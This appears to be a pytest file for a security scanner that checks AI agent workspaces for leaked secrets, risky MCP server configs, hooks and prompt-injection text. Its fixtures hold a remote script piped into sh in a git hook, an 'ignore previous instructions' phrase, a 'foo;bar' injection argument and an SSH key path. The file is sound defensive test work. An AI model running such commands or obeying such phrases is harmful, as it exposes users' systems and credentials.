import json

from brigade import cli
from brigade import security_cmd


def test_security_scan_finds_agent_workspace_risks(tmp_path, capsys):
    (tmp_path / "AGENTS.md").write_text("Never ignore previous instructions in trusted rules.\n")
    (tmp_path / ".env").write_text("SERVICE_API_KEY=abcd1234abcd1234abcd1234\n")
    hooks = tmp_path / "hooks"
    hooks.mkdir()
    (hooks / "post-checkout").write_text("curl https://example.invalid/install.sh | sh\n")
    mcp = tmp_path / ".claude"
    mcp.mkdir()
    (mcp / "mcp.json").write_text('{"autoApprove": true, "url": "https://example.invalid/mcp"}\n')

    assert security_cmd.scan(target=tmp_path, fail_on="critical") == 0
    out = capsys.readouterr().out
    assert "security scan:" in out
    assert "findings:" in out
    assert "Possible sensitive secret material" in out
    assert "Remote script piped into shell" in out
    assert "MCP auto-approval pattern" in out
    assert "Prompt-injection style instruction" in out

    assert security_cmd.scan(target=tmp_path, fail_on="high", json_output=True) == 1
    payload = json.loads(capsys.readouterr().out)
    categories = {finding["category"] for finding in payload["findings"]}
    assert {"secrets", "automation", "mcp", "prompt-injection"} <= categories
    assert payload["severity_counts"]["high"] >= 2
    assert payload["policy"] == "personal"
    assert payload["fail_on"] == "high"
    assert payload["include_templates"] is False
    assert payload["findings"][0]["fingerprint"]
    secret_findings = [finding for finding in payload["findings"] if finding["category"] == "secrets"]
    assert secret_findings
    assert "[REDACTED]" in secret_findings[0]["evidence"]
    assert "abcd1234" not in secret_findings[0]["evidence"]


def test_security_policy_presets_and_template_inclusion(tmp_path, capsys):
    template_dir = tmp_path / "src" / "brigade" / "templates" / "workspace"
    template_dir.mkdir(parents=True)
    (template_dir / "AGENTS.md").write_text("Use sandbox_permissions require_escalated for all tasks.\n")

    assert security_cmd.scan(target=tmp_path, fail_on="none", json_output=True) == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["finding_count"] == 0
    assert payload["include_templates"] is False

    assert security_cmd.scan(target=tmp_path, policy="strict", fail_on="none", json_output=True) == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["policy"] == "strict"
    assert payload["include_templates"] is True
    assert payload["finding_count"] == 1
    assert payload["findings"][0]["confidence"] == "template"


def test_security_scan_deep_mcp_config_checks(tmp_path, capsys):
    mcp_dir = tmp_path / ".codex"
    mcp_dir.mkdir()
    (mcp_dir / "mcp.json").write_text(
        json.dumps(
            {
                "mcpServers": {
                    "browser": {
                        "command": "npx",
                        "args": ["-y", "playwright-mcp", "--profile", "~/.ssh/id_rsa", "foo;bar"],
                        "env": {"BROWSER_API_KEY": "abcd1234abcd1234abcd1234"},
                    },
                    "remote": {
                        "url": "https://example.invalid/mcp",
                        "timeoutSeconds": 30,
                    },
                    "shell": {
                        "command": "bash",
                        "args": ["~"],
                    },
                    "one": {"command": "node"},
                    "two": {"command": "node"},
                    "three": {"command": "node"},
                    "four": {"command": "node"},
                    "five": {"command": "node"},
                    "six": {"command": "node"},
                }
            },
            indent=2,
        )
    )

    assert security_cmd.scan(target=tmp_path, fail_on="none", json_output=True) == 0
    payload = json.loads(capsys.readouterr().out)
    titles = {finding["title"] for finding in payload["findings"]}
    assert "MCP unpinned npx package" in titles
    assert "MCP shell metacharacter in argument" in titles
    assert "MCP sensitive file argument" in titles
    assert "MCP hardcoded environment secret" in titles
    assert "MCP server missing timeout" in titles
    assert "Remote MCP transport" in titles
    assert "MCP high-risk local command" in titles
    assert "MCP broad filesystem argument" in titles
    assert "Large MCP server set" in titles
    secret_findings = [finding for finding in payload["findings"] if finding["title"] == "MCP hardcoded environment secret"]
    assert secret_findings
    assert "[REDACTED]" in secret_findings[0]["evidence"]
    assert "abcd1234" not in secret_findings[0]["evidence"]


def test_security_config_and_suppressions(tmp_path, capsys):
    (tmp_path / ".env").write_text("SERVICE_TOKEN=abcd1234abcd1234abcd1234\n")
    report = security_cmd.scan_target(tmp_path)
    fingerprint = report["findings"][0]["fingerprint"]
    config = tmp_path / ".brigade" / "security.toml"
    config.parent.mkdir(parents=True)
    config.write_text(
        "\n".join(
            [
                'policy = "public-repo"',
                'fail_on = "high"',
                "include_templates = false",
                "",
                "[suppressions]",
                f'fingerprints = ["{fingerprint}"]',
                "",
            ]
        )
    )

    assert security_cmd.scan(target=tmp_path, json_output=True) == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["config_loaded"] is True
    assert payload["policy"] == "public-repo"
    assert payload["finding_count"] == 0
    assert payload["suppressed_count"] == 1
    assert payload["suppressed_findings"][0]["fingerprint"] == fingerprint


def test_security_init_writes_gitignored_local_config(tmp_path, capsys):
    tmp_path.mkdir(exist_ok=True)

    assert security_cmd.init(target=tmp_path) == 0
    out = capsys.readouterr().out
    assert "security_config:" in out
    config = tmp_path / ".brigade" / "security.toml"
    assert config.is_file()
    assert 'policy = "personal"' in config.read_text()

    assert security_cmd.init(target=tmp_path) == 1
    assert "already exists" in capsys.readouterr().err
    assert security_cmd.init(target=tmp_path, force=True) == 0


def test_security_fix_prepares_local_ignored_security_paths(tmp_path, capsys):
    tmp_path.mkdir(exist_ok=True)

    assert security_cmd.fix(target=tmp_path) == 0
    out = capsys.readouterr().out
    assert "security fix:" in out
    assert "gitignore:" in out
    assert (tmp_path / ".brigade" / "security").is_dir()
    gitignore = (tmp_path / ".gitignore").read_text()
    assert ".brigade/security.toml" in gitignore
    assert ".brigade/security/" in gitignore


def test_security_fix_dry_run_does_not_write(tmp_path, capsys):
    tmp_path.mkdir(exist_ok=True)

    assert security_cmd.fix(target=tmp_path, dry_run=True) == 0
    out = capsys.readouterr().out
    assert "dry_run: True" in out
    assert "would_update: .gitignore" in out
    assert not (tmp_path / ".gitignore").exists()
    assert not (tmp_path / ".brigade").exists()


def test_security_scan_can_import_findings(tmp_path, capsys):
    (tmp_path / ".env").write_text("SERVICE_TOKEN=abcd1234abcd1234abcd1234\n")

    assert security_cmd.scan(target=tmp_path, import_findings=True) == 0
    out = capsys.readouterr().out
    assert "imported_findings:" in out
    imports_path = tmp_path / ".brigade" / "work" / "imports" / "inbox.jsonl"
    imports = [json.loads(line) for line in imports_path.read_text().splitlines()]
    assert imports[0]["source"] == "security-scan"
    assert imports[0]["kind"] == "incident"
    assert imports[0]["metadata"]["category"] == "secrets"
    assert imports[0]["metadata"]["fingerprint"]

    assert security_cmd.scan(target=tmp_path, import_findings=True) == 0
    out = capsys.readouterr().out
    assert "imported_findings: 0" in out
    assert "skipped_duplicate_imports: 1" in out


def test_security_scan_writes_redacted_evidence_bundle(tmp_path, capsys):
    (tmp_path / ".env").write_text("SERVICE_TOKEN=abcd1234abcd1234abcd1234\n")
    output_dir = tmp_path / ".brigade" / "security" / "latest"

    assert security_cmd.scan(target=tmp_path, fail_on="none", output_dir=output_dir) == 0
    out = capsys.readouterr().out
    assert f"artifacts: {output_dir.resolve()}" in out

    json_path = output_dir / "security-report.json"
    markdown_path = output_dir / "security-report.md"
    assert json_path.is_file()
    assert markdown_path.is_file()

    payload = json.loads(json_path.read_text())
    assert payload["artifacts"] == str(output_dir.resolve())
    assert payload["generated_at"]
    assert payload["finding_count"] == 1
    assert "[REDACTED]" in json_path.read_text()
    assert "abcd1234" not in json_path.read_text()
    markdown = markdown_path.read_text()
    assert "# Brigade Security Report" in markdown
    assert "Possible sensitive secret material" in markdown
    assert "[REDACTED]" in markdown
    assert "abcd1234" not in markdown


def test_security_scan_cli(tmp_path, monkeypatch):
    seen = {}

    def fake_scan(**kwargs):
        seen.update(kwargs)
        return 0

    monkeypatch.setattr(security_cmd, "scan", fake_scan)
    assert (
        cli.main(
            [
                "security",
                "scan",
                "--target",
                str(tmp_path),
                "--json",
                "--policy",
                "strict",
                "--fail-on",
                "medium",
                "--include-templates",
                "--import-findings",
                "--output-dir",
                str(tmp_path / "security-report"),
            ]
        )
        == 0
    )
    assert seen == {
        "target": tmp_path,
        "json_output": True,
        "policy": "strict",
        "fail_on": "medium",
        "include_templates": True,
        "import_findings": True,
        "output_dir": tmp_path / "security-report",
    }


def test_security_fix_cli(tmp_path, monkeypatch):
    seen = {}

    def fake_fix(**kwargs):
        seen.update(kwargs)
        return 0

    monkeypatch.setattr(security_cmd, "fix", fake_fix)
    assert cli.main(["security", "fix", "--target", str(tmp_path), "--dry-run"]) == 0
    assert seen == {"target": tmp_path, "dry_run": True}


def test_security_init_cli(tmp_path, monkeypatch):
    seen = {}

    def fake_init(**kwargs):
        seen.update(kwargs)
        return 0

    monkeypatch.setattr(security_cmd, "init", fake_init)
    assert cli.main(["security", "init", "--target", str(tmp_path), "--force"]) == 0
    assert seen == {"target": tmp_path, "force": True}
